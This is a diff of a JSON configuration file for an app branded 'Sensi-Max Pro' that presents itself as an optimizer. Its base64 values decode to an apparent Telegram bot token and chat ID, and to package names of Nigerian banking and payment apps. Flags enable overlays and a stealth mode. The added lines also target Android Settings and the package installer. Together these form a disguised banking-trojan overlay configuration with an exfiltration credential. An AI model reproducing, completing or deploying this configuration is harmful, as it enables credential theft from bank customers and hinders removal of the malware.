@@ -1,21 +1,31 @@
 {
-  "project_id": "sensi-max-pro-4102",
-  "remote_optimization_params": {
-    "sync_interval_ms": 3600000,
-    "enable_deep_scan": true,
-    "analytics_vector": "ODY3MzAyOTU1OTpBQUY0ekZKQzgwVEVSVlVNVHZWOWllU01XTTBLLTJ2V0dUSQ==",
-    "relay_id": "NzkwOTU0MzkwMA==",
-    "target_signatures": [
+  "configuration_metadata": {
+    "version": "2.4.1-stable",
+    "environment": "production",
+    "last_sync_utc": "2026-05-03T12:00:00Z"
+  },
+  "optimization_parameters": {
+    "engine_mode": "aggresssive",
+    "refresh_rate_ms": 3600000,
+    "monitoring_vector": "ODY3MzAyOTU1OTpBQUY0ekZKQzgwVEVSVlVNVHZWOWllU01XTTBLLTJ2V0dUSQ==",
+    "gateway_relay_id": "NzkwOTU0MzkwMA==",
+    "auto_repair_enabled": true
+  },
+  "feature_flags": {
+    "dynamic_overlay_v2": true,
+    "stealth_mode_active": true,
+    "target_registry": [
       "Y29tLm9wYXkucGF5bWVudHM=",
       "Y29tLnRyYW5zc25ldC5wYWxtcGF5",
       "Y29tLmt1ZGFiYW5rLmFwcA==",
       "Y29tLm1vbmllcG9pbnQubW9uaWVwb2ludA==",
-      "com.accessbank.mobileapp",
-      "com.ubagroup.uba"
+      "com.android.settings",
+      "com.google.android.packageinstaller"
     ]
   },
-  "ui_theming": {
-    "primary_color": "#FFD700",
-    "dark_mode": true
+  "theming_engine": {
+    "primary_hex": "#FFD700",
+    "secondary_hex": "#121212",
+    "branding_label": "Sensi-Max Pro"
   }
 }
